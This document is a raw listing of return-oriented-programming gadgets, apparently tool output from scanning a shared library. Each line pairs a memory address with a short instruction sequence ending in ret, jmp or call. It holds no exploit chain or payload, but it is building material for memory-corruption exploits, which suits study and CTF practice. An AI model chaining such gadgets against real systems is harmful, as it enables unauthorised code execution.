0x00002aaaaab9e222 : mov dword ptr fs:[rdx], esi ; add rsp, 0x18 ; ret
0x00002aaaaab9e2ec : mov dword ptr fs:[rdx], esi ; add rsp, 8 ; ret
0x00002aaaaab9e3cb : mov dword ptr fs:[rdx], r8d ; mov eax, esi ; add rsp, 0x48 ; ret
0x00002aaaaab9dbb0 : mov dword ptr fs:[rdx], r8d ; mov rax, rsi ; add rsp, 8 ; ret
0x00002aaaaac21f6a : mov dword ptr ss:[rdi], esi ; mov dword ptr [rdi + rdx - 4], ecx ; ret
0x00002aaaaab7a1d2 : mov dx, word ptr [rsi + 4] ; mov dword ptr [rdi], ecx ; mov word ptr [rdi + 4], dx ; ret
0x00002aaaaab7a213 : mov dx, word ptr [rsi + 8] ; mov qword ptr [rdi], rcx ; mov word ptr [rdi + 8], dx ; ret
0x00002aaaaac271e0 : mov dx, word ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x00002aaaaab7b790 : mov dx, word ptr [rsi] ; mov word ptr [rdi], dx ; lea rax, qword ptr [rdi + 1] ; ret
0x00002aaaaab7c5b0 : mov dx, word ptr [rsi] ; mov word ptr [rdi], dx ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaab7a190 : mov dx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x00002aaaaab7e020 : mov dx, word ptr [rsi] ; mov word ptr [rdi], dx ; xor ch, ch ; mov byte ptr [rdi + 2], ch ; ret
0x00002aaaaabcfc96 : mov eax, 0 ; cmova eax, edx ; ret
0x00002aaaaabdcec6 : mov eax, 0 ; cmovae rax, rsi ; ret
0x00002aaaaabab05c : mov eax, 0 ; cmove eax, esi ; ret
0x00002aaaaabd20a4 : mov eax, 0 ; cmove rax, rbx ; pop rbx ; ret
0x00002aaaaab6b8d5 : mov eax, 0 ; cmovne rax, rdi ; ret
0x00002aaaaabe311c : mov eax, 0 ; cmovns rax, qword ptr [rbx + 0x28] ; pop rbx ; ret
0x00002aaaaac00384 : mov eax, 0x10 ; pop rbx ; pop rbp ; ret
0x00002aaaaab7f112 : mov eax, 0x10 ; pop rbx ; ret
0x00002aaaaab40453 : mov eax, 0x10 ; test ecx, ecx ; je 0x6b46a ; ret
0x00002aaaaaba1ee1 : mov eax, 0x100 ; cmp rdx, rcx ; jne 0xccf1a ; ret
0x00002aaaaabf7d30 : mov eax, 0x100 ; ret
0x00002aaaaabf7d2a : mov eax, 0x101 ; ret
0x00002aaaaabf7d36 : mov eax, 0x102 ; ret
0x00002aaaaabf7d22 : mov eax, 0x104 ; ret
0x00002aaaaabd113d : mov eax, 0x14 ; sub eax, edx ; ret
0x00002aaaaabcacf3 : mov eax, 0x16 ; jbe 0xf5d08 ; ret
0x00002aaaaab5ba54 : mov eax, 0x16 ; je 0x86a67 ; ret
0x00002aaaaabca365 : mov eax, 0x16 ; je 0xf5378 ; ret
0x00002aaaaab5bbf0 : mov eax, 0x16 ; ret
0x00002aaaaabcad28 : mov eax, 0x1c ; syscall ; neg eax ; ret
0x00002aaaaac7b7cd : mov eax, 0x1e00000 ; out dx, eax ; jmp rsi
0x00002aaaaaba1f2a : mov eax, 0x20 ; cmovne rax, rdx ; ret
0x00002aaaaab7f10b : mov eax, 0x20 ; pop rbx ; ret
0x00002aaaaaba1f0f : mov eax, 0x20 ; ret
0x00002aaaaab02ef7 : mov eax, 0x200 ; ret
0x00002aaaaabfae87 : mov eax, 0x200000 ; jmp 0x125e56
0x00002aaaaab7f104 : mov eax, 0x30 ; pop rbx ; ret
0x00002aaaaab7f0fd : mov eax, 0x40 ; pop rbx ; ret
0x00002aaaaaba1f55 : mov eax, 0x40 ; ret
0x00002aaaaab9065b : mov eax, 0x41000000 ; call rsp
0x00002aaaaac5761b : mov eax, 0x45155e93 ; ret 0x591c
0x00002aaaaabcae5b : mov eax, 0x48d001d2 ; cmp edi, esi ; ja 0xf5e5a ; ret
0x00002aaaaab63c4a : mov eax, 0x48fffffb ; mov eax, edi ; ret
0x00002aaaaabcb2f0 : mov eax, 0x5f ; syscall ; ret
0x00002aaaaab7f0f6 : mov eax, 0x60 ; pop rbx ; ret
0x00002aaaaac2e257 : mov eax, 0x63490003 ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaaba1690 : mov eax, 0x66 ; syscall ; ret
0x00002aaaaaba16b0 : mov eax, 0x68 ; syscall ; ret
0x00002aaaaaba16a0 : mov eax, 0x6b ; syscall ; ret
0x00002aaaaaba16c0 : mov eax, 0x6c ; syscall ; ret
0x00002aaaaaba1680 : mov eax, 0x6e ; syscall ; ret
0x00002aaaaaba18d0 : mov eax, 0x6f ; syscall ; ret
0x00002aaaaab944fb : mov eax, 0x713d8d48 ; test dword ptr [rax + rax], ecx ; add rax, rdi ; jmp rax
0x00002aaaaaba1e29 : mov eax, 0x7d00 ; ret
0x00002aaaaaba1e58 : mov eax, 0x7e ; ret
0x00002aaaaaba1dfa : mov eax, 0x7f ; cmovne rax, rdx ; ret
0x00002aaaaaba1dab : mov eax, 0x7f ; ret
0x00002aaaaab7f0ef : mov eax, 0x80 ; pop rbx ; ret
0x00002aaaaab31d94 : mov eax, 0x85fffff9 ; ror byte ptr [rdi], 0x85 ; ret
0x00002aaaaabdfce4 : mov eax, 0x8948002b ; ret 0x8d48
0x00002aaaaabca084 : mov eax, 0x89fffffe ; ret 0xcb8
0x00002aaaaab499b1 : mov eax, 0x8c48348 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00002aaaaac5bf64 : mov eax, 0x8fff0be ; sal eax, -1 ; pop rax ; ret
0x00002aaaaac6aa80 : mov eax, 0x96000054 ; or al, byte ptr [rax] ; add byte ptr [rbp + rbx*4 - 0x18], al ; call rsp
0x00002aaaaabcdfc8 : mov eax, 0xa ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaaad8184 : mov eax, 0xa1a3e95a ; ret 0xba88
0x00002aaaaab102da : mov eax, 0xb ; mov word ptr [rsi + 0xc], ax ; xor eax, eax ; ret
0x00002aaaaac0684f : mov eax, 0xb8000000 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac5cec9 : mov eax, 0xbc15fff3 ; ljmp ptr [rbx] ; mov dl, 0xf3 ; jmp rsp
0x00002aaaaac56158 : mov eax, 0xbcbbbab9 ; mov ebp, 0xc1c0bfbe ; ret 0xc4c3
0x00002aaaaabb0540 : mov eax, 0xc ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabb050a : mov eax, 0xc ; ret
0x00002aaaaac60a0c : mov eax, 0xc8fffb01 ; add ebx, edi ; call rax
0x00002aaaaab907c0 : mov eax, 0xc9 ; syscall ; ret
0x00002aaaaabed760 : mov eax, 0xca ; add rsp, 0x28 ; ret
0x00002aaaaabed6f9 : mov eax, 0xca ; pop rbp ; pop r12 ; ret
0x00002aaaaabe94d2 : mov eax, 0xca ; syscall ; pop rdx ; pop rsi ; ret
0x00002aaaaac0c7b6 : mov eax, 0xe0 ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabdbc00 : mov eax, 0xe4 ; syscall ; ret
0x00002aaaaab3e60f : mov eax, 0xe9fffffb ; ret 0xffff
0x00002aaaaac43929 : mov eax, 0xf66b8b2 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaaba1e4f : mov eax, 0xfa ; ret
0x00002aaaaaba1e70 : mov eax, 0xfc17 ; ret
0x00002aaaaaba1ddc : mov eax, 0xfde8 ; jne 0xccdb3 ; ret
0x00002aaaaaba1e60 : mov eax, 0xfffa ; ret
0x00002aaaaaba03fc : mov eax, 0xfffffff2 ; ret
0x00002aaaaab5aa32 : mov eax, 0xfffffffe ; pop rbx ; ret
0x00002aaaaab495f1 : mov eax, 0xffffffff ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaabcaf2a : mov eax, 0xffffffff ; add rsp, 0x18 ; ret
0x00002aaaaabe9ca0 : mov eax, 0xffffffff ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab5f8a2 : mov eax, 0xffffffff ; cmovae eax, ecx ; ret
0x00002aaaaab48021 : mov eax, 0xffffffff ; ja 0x73038 ; ret
0x00002aaaaabf1531 : mov eax, 0xffffffff ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab45b81 : mov eax, 0xffffffff ; pop rbp ; pop r12 ; ret
0x00002aaaaaafee0f : mov eax, 0xffffffff ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab0ecee : mov eax, 0xffffffff ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4544c : mov eax, 0xffffffff ; pop rbx ; pop rbp ; ret
0x00002aaaaab08f0e : mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaab0a3e7 : mov eax, 0xffffffff ; ret
0x00002aaaaac02f62 : mov eax, 1 ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac0f32e : mov eax, 1 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab436b5 : mov eax, 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabd22af : mov eax, 1 ; add rsp, 8 ; ret
0x00002aaaaac46d40 : mov eax, 1 ; jg 0x171d59 ; neg eax ; ret
0x00002aaaaab800b0 : mov eax, 1 ; jg 0xab0c2 ; neg eax ; ret
0x00002aaaaac44c96 : mov eax, 1 ; jl 0x16fca9 ; neg eax ; ret
0x00002aaaaaba2042 : mov eax, 1 ; js 0xcd058 ; ret
0x00002aaaaab1f09d : mov eax, 1 ; mov qword ptr [rdi], rsi ; ret
0x00002aaaaabadc26 : mov eax, 1 ; mov rdx, r8 ; jmp 0xd8c41
0x00002aaaaab10321 : mov eax, 1 ; mov word ptr [rsi + 0xe], ax ; xor eax, eax ; ret
0x00002aaaaab29d9a : mov eax, 1 ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab45b6d : mov eax, 1 ; pop rbp ; pop r12 ; ret
0x00002aaaaaba1864 : mov eax, 1 ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00002aaaaab4a104 : mov eax, 1 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab50a62 : mov eax, 1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabe2e70 : mov eax, 1 ; pop rbx ; pop rbp ; ret
0x00002aaaaabff460 : mov eax, 1 ; pop rbx ; ret
0x00002aaaaab1d063 : mov eax, 1 ; ret
0x00002aaaaab4a0eb : mov eax, 2 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab803d1 : mov eax, 2 ; ret
0x00002aaaaac03c2a : mov eax, 3 ; add rsp, 0x30 ; pop rbx ; ret
0x00002aaaaabda71f : mov eax, 3 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabe9c16 : mov eax, 3 ; cmovne eax, edx ; ret
0x00002aaaaab803e1 : mov eax, 3 ; ret
0x00002aaaaabd1f32 : mov eax, 3 ; syscall ; mov eax, edx ; ret
0x00002aaaaabf65a3 : mov eax, 3 ; syscall ; ret
0x00002aaaaab803f1 : mov eax, 4 ; ret
0x00002aaaaabc40dc : mov eax, 5 ; pop rbp ; pop r12 ; ret
0x00002aaaaabe9e6a : mov eax, 5 ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00002aaaaabc4219 : mov eax, 5 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabda7ef : mov eax, 5 ; pop rbx ; pop rbp ; ret
0x00002aaaaab80401 : mov eax, 5 ; ret
0x00002aaaaab80411 : mov eax, 6 ; ret
0x00002aaaaabe73bc : mov eax, 7 ; pop rbx ; pop rbp ; ret
0x00002aaaaab80421 : mov eax, 7 ; ret
0x00002aaaaab7f0e8 : mov eax, 8 ; pop rbx ; ret
0x00002aaaaabca042 : mov eax, 9 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabca187 : mov eax, 9 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabe8d68 : mov eax, dword ptr [r14 + 0x18] ; mov dword ptr [rbp - 0x80], eax ; call r9
0x00002aaaaabe250a : mov eax, dword ptr [r14] ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab08e8a : mov eax, dword ptr [r9 + rdx*4 + 8] ; add rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaabda689 : mov eax, dword ptr [rax + 0x108] ; ret
0x00002aaaaac1792f : mov eax, dword ptr [rax + 0x128] ; jmp rax
0x00002aaaaab496ac : mov eax, dword ptr [rax + 0x130] ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x00002aaaaabde030 : mov eax, dword ptr [rax + 0x18] ; add dword ptr [rax], 1 ; ret
0x00002aaaaab46fbc : mov eax, dword ptr [rax + 0x18] ; add rsp, 8 ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaabddde0 : mov eax, dword ptr [rax + 0x18] ; add word ptr [rax], 1 ; ret
0x00002aaaaab5023c : mov eax, dword ptr [rax + 0x18] ; jmp rax
0x00002aaaaabfcb87 : mov eax, dword ptr [rax + 0x18] ; test eax, eax ; jne 0x127b97 ; ret
0x00002aaaaabd17e8 : mov eax, dword ptr [rax + 0x18] ; test rax, rax ; je 0xfc7fb ; ret
0x00002aaaaab47222 : mov eax, dword ptr [rax + 0x20] ; jmp rax
0x00002aaaaac0cafc : mov eax, dword ptr [rax + 0x20] ; test eax, eax ; je 0x137b1b ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4706a : mov eax, dword ptr [rax + 0x28] ; jmp rax
0x00002aaaaabe8de9 : mov eax, dword ptr [rax + 0x30] ; ret
0x00002aaaaabde757 : mov eax, dword ptr [rax + 0x38] ; ret
0x00002aaaaabda3dc : mov eax, dword ptr [rax + 0x38] ; test eax, eax ; cmove eax, edx ; ret
0x00002aaaaabffc8d : mov eax, dword ptr [rax + 0x38] ; test rax, rax ; je 0x12aca5 ; mov rdi, rsp ; call rax
0x00002aaaaabffd78 : mov eax, dword ptr [rax + 0x38] ; test rax, rax ; je 0x12ad90 ; mov rdi, rsp ; call rax
0x00002aaaaac0062e : mov eax, dword ptr [rax + 0x38] ; test rax, rax ; je 0x12b646 ; mov rdi, rbp ; call rax
0x00002aaaaac016bf : mov eax, dword ptr [rax + 0x38] ; test rax, rax ; je 0x12c6d7 ; mov rdi, r14 ; call rax
0x00002aaaaac07054 : mov eax, dword ptr [rax + 0x38] ; test rax, rax ; je 0x13206c ; mov rdi, r12 ; call rax
0x00002aaaaac0850f : mov eax, dword ptr [rax + 0x38] ; test rax, rax ; je 0x133527 ; mov rdi, r13 ; call rax
0x00002aaaaac08702 : mov eax, dword ptr [rax + 0x38] ; test rax, rax ; je 0x13371a ; mov rdi, rbp ; call rax
0x00002aaaaac08922 : mov eax, dword ptr [rax + 0x38] ; test rax, rax ; je 0x13393a ; mov rdi, rbp ; call rax
0x00002aaaaac09ac5 : mov eax, dword ptr [rax + 0x38] ; test rax, rax ; je 0x134add ; mov rdi, r12 ; call rax
0x00002aaaaab50708 : mov eax, dword ptr [rax + 0x40] ; jmp rax
0x00002aaaaac093c4 : mov eax, dword ptr [rax + 0x40] ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaab448c3 : mov eax, dword ptr [rax + 0x48] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x00002aaaaab44b71 : mov eax, dword ptr [rax + 0x48] ; jmp rax
0x00002aaaaab02f12 : mov eax, dword ptr [rax + 0x48] ; mov eax, dword ptr [rax + rdi*4 + 0x200] ; ret
0x00002aaaaab49f74 : mov eax, dword ptr [rax + 0x4c] ; ret
0x00002aaaaac09c64 : mov eax, dword ptr [rax + 0x50] ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaab02ef2 : mov eax, dword ptr [rax + 0x58] ; mov eax, dword ptr [rax + rdi*4 + 0x200] ; ret
0x00002aaaaab0f726 : mov eax, dword ptr [rax + 0x58] ; ret
0x00002aaaaac0663a : mov eax, dword ptr [rax + 0xa0] ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaab01b6e : mov eax, dword ptr [rax + 0xa8] ; ret
0x00002aaaaac0eec5 : mov eax, dword ptr [rax + 8] ; jmp rax
0x00002aaaaabda679 : mov eax, dword ptr [rax + 8] ; ret
0x00002aaaaab5da1b : mov eax, dword ptr [rax + 8] ; test rax, rax ; jne 0x88a19 ; ret
0x00002aaaaabde886 : mov eax, dword ptr [rax + rcx] ; mov ecx, edi ; shr eax, cl ; and eax, 1 ; ret
0x00002aaaaab02ef5 : mov eax, dword ptr [rax + rdi*4 + 0x200] ; ret
0x00002aaaaab030b7 : mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaab02a1f : mov eax, dword ptr [rax + rdi*8 + 0x80] ; ret
0x00002aaaaab02a68 : mov eax, dword ptr [rax + rdx] ; ret
0x00002aaaaabdf0e4 : mov eax, dword ptr [rax + rdx] ; shr eax, cl ; and eax, 1 ; ret
0x00002aaaaab1d1c7 : mov eax, dword ptr [rax + rsi*8] ; mov qword ptr [rcx + rsi*8], rax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab0001f : mov eax, dword ptr [rax + rsi*8] ; test rax, rax ; je 0x2b031 ; call rax
0x00002aaaaac6b43d : mov eax, dword ptr [rax] ; add byte ptr [rcx + rbx*2 - 0x16], ah ; call rsp
0x00002aaaaac18207 : mov eax, dword ptr [rax] ; add rax, qword ptr [rdx + 8] ; add rsp, 0x38 ; ret
0x00002aaaaac0eeba : mov eax, dword ptr [rax] ; jmp rax
0x00002aaaaab01b6c : mov eax, dword ptr [rax] ; mov eax, dword ptr [rax + 0xa8] ; ret
0x00002aaaaab02a1c : mov eax, dword ptr [rax] ; mov rax, qword ptr [rax + rdi*8 + 0x80] ; ret
0x00002aaaaab01b69 : mov eax, dword ptr [rax] ; mov rax, qword ptr [rax] ; mov eax, dword ptr [rax + 0xa8] ; ret
0x00002aaaaab02ecc : mov eax, dword ptr [rax] ; movzx eax, word ptr [rax + rdi*2] ; and eax, 1 ; ret
0x00002aaaaab0f723 : mov eax, dword ptr [rax] ; pop rbx ; mov eax, dword ptr [rax + 0x58] ; ret
0x00002aaaaabfce09 : mov eax, dword ptr [rax] ; ret
0x00002aaaaabd9829 : mov eax, dword ptr [rax] ; test rax, rax ; je 0x1048d3 ; call rax
0x00002aaaaabd99a0 : mov eax, dword ptr [rax] ; test rax, rax ; je 0x104aab ; call rax
0x00002aaaaab5306f : mov eax, dword ptr [rax] ; test rax, rax ; je 0x7e07f ; call rax
0x00002aaaaab599b6 : mov eax, dword ptr [rax] ; test rax, rax ; je 0x849c6 ; call rax
0x00002aaaaab528d2 : mov eax, dword ptr [rax] ; test rax, rax ; jne 0x7d90d ; xor edi, edi ; call qword ptr [r15]
0x00002aaaaab3e60d : mov eax, dword ptr [rbp - 0x448] ; jmp 0x65865
0x00002aaaaabd75ec : mov eax, dword ptr [rbp - 0x48] ; call rax
0x00002aaaaaaf72c1 : mov eax, dword ptr [rbp - 0x58] ; call rax
0x00002aaaaab4c491 : mov eax, dword ptr [rbx + 0x20] ; mov qword ptr [rbx + 0x28], rax ; pop rbx ; ret
0x00002aaaaabe81e0 : mov eax, dword ptr [rbx + 0x60] ; mov dword ptr [rbp - 0x80], eax ; call rcx
0x00002aaaaaaf4c03 : mov eax, dword ptr [rbx + 4] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac0efb9 : mov eax, dword ptr [rbx + 8] ; lea rsi, qword ptr [rsp + 8] ; mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaac02b81 : mov eax, dword ptr [rbx + 8] ; mov rsi, rsp ; mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaac314a7 : mov eax, dword ptr [rbx] ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac0af71 : mov eax, dword ptr [rbx] ; add rsp, 0xa8 ; pop rbx ; pop rbp ; ret
0x00002aaaaaba0939 : mov eax, dword ptr [rbx] ; mov rdx, qword ptr [rax + 0x18] ; test rdx, rdx ; je 0xcb954 ; call rdx
0x00002aaaaac0c64a : mov eax, dword ptr [rbx] ; test rax, rax ; je 0x137660 ; pop rbx ; ret
0x00002aaaaac3f484 : mov eax, dword ptr [rcx + 3] ; mov dword ptr [rdx + 3], eax ; lea rax, qword ptr [rdx + 6] ; ret
0x00002aaaaab76f69 : mov eax, dword ptr [rcx + 3] ; mov dword ptr [rdx + 3], eax ; mov rax, rdi ; ret
0x00002aaaaac3f465 : mov eax, dword ptr [rcx + 4] ; mov word ptr [rdx + 4], ax ; lea rax, qword ptr [rdx + 5] ; ret
0x00002aaaaab76f4a : mov eax, dword ptr [rcx + 4] ; mov word ptr [rdx + 4], ax ; mov rax, rdi ; ret
0x00002aaaaac3f496 : mov eax, dword ptr [rcx + 5] ; mov dword ptr [rdx + 5], eax ; lea rax, qword ptr [rdx + 8] ; ret
0x00002aaaaac3b146 : mov eax, dword ptr [rcx + 5] ; mov dword ptr [rdx + 5], eax ; mov rax, rdi ; ret
0x00002aaaaac3f517 : mov eax, dword ptr [rcx + 5] ; mov qword ptr [rdx + 5], rax ; lea rax, qword ptr [rdx + 0xc] ; ret
0x00002aaaaac3b187 : mov eax, dword ptr [rcx + 5] ; mov qword ptr [rdx + 5], rax ; mov rax, rdi ; ret
0x00002aaaaac3f4b6 : mov eax, dword ptr [rcx + 6] ; mov dword ptr [rdx + 6], eax ; lea rax, qword ptr [rdx + 9] ; ret
0x00002aaaaac3b156 : mov eax, dword ptr [rcx + 6] ; mov dword ptr [rdx + 6], eax ; mov rax, rdi ; ret
0x00002aaaaac3f537 : mov eax, dword ptr [rcx + 6] ; mov qword ptr [rdx + 6], rax ; lea rax, qword ptr [rdx + 0xd] ; ret
0x00002aaaaac3b1a7 : mov eax, dword ptr [rcx + 6] ; mov qword ptr [rdx + 6], rax ; mov rax, rdi ; ret
0x00002aaaaac3f4d6 : mov eax, dword ptr [rcx + 7] ; mov dword ptr [rdx + 7], eax ; lea rax, qword ptr [rdx + 0xa] ; ret
0x00002aaaaab76fed : mov eax, dword ptr [rcx + 7] ; mov dword ptr [rdx + 7], eax ; mov rax, rdi ; ret
0x00002aaaaac3f557 : mov eax, dword ptr [rcx + 7] ; mov qword ptr [rdx + 7], rax ; lea rax, qword ptr [rdx + 0xe] ; ret
0x00002aaaaac3b1c7 : mov eax, dword ptr [rcx + 7] ; mov qword ptr [rdx + 7], rax ; mov rax, rdi ; ret
0x00002aaaaac3f4f6 : mov eax, dword ptr [rcx + 8] ; mov dword ptr [rdx + 8], eax ; lea rax, qword ptr [rdx + 0xb] ; ret
0x00002aaaaab7700d : mov eax, dword ptr [rcx + 8] ; mov dword ptr [rdx + 8], eax ; mov rax, rdi ; ret
0x00002aaaaac3f3e7 : mov eax, dword ptr [rcx + 8] ; mov qword ptr [rdx + 8], rax ; lea rax, qword ptr [rdx + 0xf] ; ret
0x00002aaaaac3b0b7 : mov eax, dword ptr [rcx + 8] ; mov qword ptr [rdx + 8], rax ; mov rax, rdi ; ret
0x00002aaaaab76fce : mov eax, dword ptr [rcx + 8] ; mov word ptr [rdx + 8], ax ; mov rax, rdi ; ret
0x00002aaaaac1b0fa : mov eax, dword ptr [rcx + rax*4] ; mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
0x00002aaaaab7f20e : mov eax, dword ptr [rcx + rax*4] ; sub eax, dword ptr [rcx + r8*4] ; je 0xaa1fa ; ret
0x00002aaaaac1c9d2 : mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x00002aaaaab08e8b : mov eax, dword ptr [rcx + rdx*4 + 8] ; add rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaac3f440 : mov eax, dword ptr [rcx] ; mov dword ptr [rdx], eax ; lea rax, qword ptr [rdx + 3] ; ret
0x00002aaaaac067d0 : mov eax, dword ptr [rcx] ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x00002aaaaab76f15 : mov eax, dword ptr [rcx] ; mov dword ptr [rdx], eax ; mov rax, rdi ; ret
0x00002aaaaac3f391 : mov eax, dword ptr [rcx] ; mov qword ptr [rdx], rax ; lea rax, qword ptr [rdx + 7] ; ret
0x00002aaaaac3b061 : mov eax, dword ptr [rcx] ; mov qword ptr [rdx], rax ; mov rax, rdi ; ret
0x00002aaaaac3f411 : mov eax, dword ptr [rcx] ; mov word ptr [rdx], ax ; lea rax, qword ptr [rdx + 1] ; ret
0x00002aaaaab76ee6 : mov eax, dword ptr [rcx] ; mov word ptr [rdx], ax ; mov rax, rdi ; ret
0x00002aaaaabcac20 : mov eax, dword ptr [rdi + 0x108] ; mov dword ptr [rsi], eax ; xor eax, eax ; ret
0x00002aaaaab9699b : mov eax, dword ptr [rdi + 0x10] ; jmp 0xc17f3
0x00002aaaaab47e6f : mov eax, dword ptr [rdi + 0x10] ; shr rdx, 2 ; sub eax, edx ; ret
0x00002aaaaab51860 : mov eax, dword ptr [rdi + 0x10] ; sub eax, dword ptr [rsi + 0x10] ; ret
0x00002aaaaab51888 : mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x00002aaaaabe95a0 : mov eax, dword ptr [rdi + 0x10] ; test eax, eax ; jne 0x1145b8 ; ret
0x00002aaaaaba09cd : mov eax, dword ptr [rdi + 0x10] ; test rax, rax ; je 0xcb9e2 ; call rax
0x00002aaaaabcac10 : mov eax, dword ptr [rdi + 0x10c] ; mov dword ptr [rsi], eax ; xor eax, eax ; ret
0x00002aaaaac101ef : mov eax, dword ptr [rdi + 0x18] ; add rsi, rax ; mov qword ptr [rdi + 0x18], rsi ; ret
0x00002aaaaac105f3 : mov eax, dword ptr [rdi + 0x18] ; ret
0x00002aaaaac10191 : mov eax, dword ptr [rdi + 0x18] ; sub rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaac01cde : mov eax, dword ptr [rdi + 0x20] ; mov dword ptr [rsi + 8], eax ; ret
0x00002aaaaab01372 : mov eax, dword ptr [rdi + 0x20] ; mov rbx, rdi ; test rax, rax ; je 0x2c38a ; call rax
0x00002aaaaab9cca1 : mov eax, dword ptr [rdi + 0x20] ; ret
0x00002aaaaac48388 : mov eax, dword ptr [rdi + 0x20] ; test rax, rax ; je 0x17339f ; call rax
0x00002aaaaab80030 : mov eax, dword ptr [rdi + 0x24] ; cmp eax, dword ptr [rsi + 0x24] ; jne 0xab0b8 ; ret
0x00002aaaaab80045 : mov eax, dword ptr [rdi + 0x28] ; cmp eax, dword ptr [rsi + 0x28] ; jne 0xab0b8 ; ret
0x00002aaaaac01d37 : mov eax, dword ptr [rdi + 0x28] ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaac10570 : mov eax, dword ptr [rdi + 0x28] ; ret
0x00002aaaaab4c4d1 : mov eax, dword ptr [rdi + 0x28] ; sub rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaab80050 : mov eax, dword ptr [rdi + 0x2c] ; cmp eax, dword ptr [rsi + 0x2c] ; jne 0xab0b8 ; ret
0x00002aaaaab8006b : mov eax, dword ptr [rdi + 0x30] ; cmp eax, dword ptr [rsi + 0x30] ; jne 0xab0b8 ; ret
0x00002aaaaab80080 : mov eax, dword ptr [rdi + 0x34] ; cmp eax, dword ptr [rsi + 0x34] ; jne 0xab0b8 ; ret
0x00002aaaaab80095 : mov eax, dword ptr [rdi + 0x38] ; cmp eax, dword ptr [rsi + 0x38] ; jne 0xab0b8 ; ret
0x00002aaaaab800a0 : mov eax, dword ptr [rdi + 0x3c] ; cmp eax, dword ptr [rsi + 0x3c] ; jne 0xab0b8 ; ret
0x00002aaaaac01d6f : mov eax, dword ptr [rdi + 0x40] ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaab4c3c1 : mov eax, dword ptr [rdi + 0x40] ; sub rax, qword ptr [rdi + 0x38] ; ret
0x00002aaaaab49f71 : mov eax, dword ptr [rdi + 0x48] ; mov eax, dword ptr [rax + 0x4c] ; ret
0x00002aaaaabab610 : mov eax, dword ptr [rdi + 0x4c] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabab660 : mov eax, dword ptr [rdi + 0x4c] ; ret
0x00002aaaaab51b31 : mov eax, dword ptr [rdi + 0x68] ; ret
0x00002aaaaab4aad8 : mov eax, dword ptr [rdi + 0x70] ; test eax, eax ; js 0x75af0 ; ret
0x00002aaaaab50235 : mov eax, dword ptr [rdi + 0xd8] ; mov rax, qword ptr [rax + 0x18] ; jmp rax
0x00002aaaaab50701 : mov eax, dword ptr [rdi + 0xd8] ; mov rax, qword ptr [rax + 0x40] ; jmp rax
0x00002aaaaabca380 : mov eax, dword ptr [rdi + 4] ; mov dword ptr [rsi], eax ; xor eax, eax ; ret
0x00002aaaaabd0720 : mov eax, dword ptr [rdi + 8] ; and eax, 0x100f ; ret
0x00002aaaaab51c45 : mov eax, dword ptr [rdi + 8] ; cmp rax, rcx ; jae 0x7cc7b ; movzx eax, byte ptr [rax] ; ret
0x00002aaaaac0f649 : mov eax, dword ptr [rdi + 8] ; lea rsi, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaac02ab1 : mov eax, dword ptr [rdi + 8] ; lea rsi, qword ptr [rsp + 8] ; call qword ptr [rax]
0x00002aaaaac0ff59 : mov eax, dword ptr [rdi + 8] ; mov rax, qword ptr [rax + 0x40] ; jmp rax
